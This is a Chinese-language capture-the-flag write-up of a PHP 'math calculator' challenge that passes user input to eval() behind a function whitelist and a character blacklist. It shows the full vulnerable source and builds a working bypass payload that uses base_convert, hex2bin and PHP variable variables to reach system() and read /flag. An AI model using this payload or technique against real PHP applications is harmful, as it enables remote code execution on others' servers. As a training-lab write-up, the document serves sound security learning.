![[Pasted image 20221202195606.png]]

---
首页长这样
```php
<?php
error_reporting(0);
//听说你很喜欢数学，不知道你是否爱它胜过爱flag
if(!isset($_GET['c'])){
    show_source(__FILE__);
}else{
    //例子 c=20-1
    $content = $_GET['c'];
    if (strlen($content) >= 80) {
        die("太长了不会算");
    }
    $blacklist = [' ', '\t', '\r', '\n','\'', '"', '`', '\[', '\]'];
    foreach ($blacklist as $blackitem) {
        if (preg_match('/' . $blackitem . '/m', $content)) {
            die("请不要输入奇奇怪怪的字符");
        }
    }
    //常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp
    $whitelist = ['abs', 'acos', 'acosh', 'asin', 'asinh', 'atan2', 'atan', 'atanh', 'base_convert', 'bindec', 'ceil', 'cos', 'cosh', 'decbin', 'dechex', 'decoct', 'deg2rad', 'exp', 'expm1', 'floor', 'fmod', 'getrandmax', 'hexdec', 'hypot', 'is_finite', 'is_infinite', 'is_nan', 'lcg_value', 'log10', 'log1p', 'log', 'max', 'min', 'mt_getrandmax', 'mt_rand', 'mt_srand', 'octdec', 'pi', 'pow', 'rad2deg', 'rand', 'round', 'sin', 'sinh', 'sqrt', 'srand', 'tan', 'tanh'];
    preg_match_all('/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/', $content, $used_funcs);  
    foreach ($used_funcs[0] as $func) {
        if (!in_array($func, $whitelist)) {
            die("请不要输入奇奇怪怪的函数");
        }
    }
    //帮你算出答案
    eval('echo '.$content.';');
}
```

---
emmm，只给数学函数感觉限死了，但`php`绝对不会让我们失望QwQ

总体上就是利用可变变量和可变函数

---
首先好像要拿一个变量承载字符串，于是选择最短的`pi`

为了保持在80个字符之内，决定给`pi`赋一个`"_GET"`，也就是
```php
$pi="_GET";
```
然后通过`pi`来绕过过滤（这个大括号访问数组和字符串的特性好像在`php7.4`之后被删了QAQ）
```php
$$pi{abs}($$pi{cos})
```
这个会变成
```php
$_GET{abs}($_GET{cos})
```
我们传入
```php
abs=system&cos=<command>
```
即可

问题转化为通过数学函数构造出`'_GET'`

虽然但是，下划线和大写字母好难弄QAQ

![[Pasted image 20221202214151.png]]

这个东西文档的解释完全没看懂哇wuwuwu

意思好像就是说传入参数是一群字符的`ascii`码的十六进制形式连在一块，然后返回值是还原这些十六进制形式为原字符的结果

也就是说只要构造出了`"hex2bin"`就可以通过`hex2bin`和`dechex`构造出`"_GET"`了

`"hex2bin"`全是字母数字，可以直接`base_convert`QwQ

![[Pasted image 20221202215159.png]]

![[Pasted image 20221202215606.png]]

所以就可以构造出最终`payload`啦
```php
/?c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));$$pi{abs}($$pi{cos})&abs=system&cos=cat /flag
```
![[Pasted image 20221202220340.png]]

#Web #PHP #RCE #function #数学 #可变变量 #bypass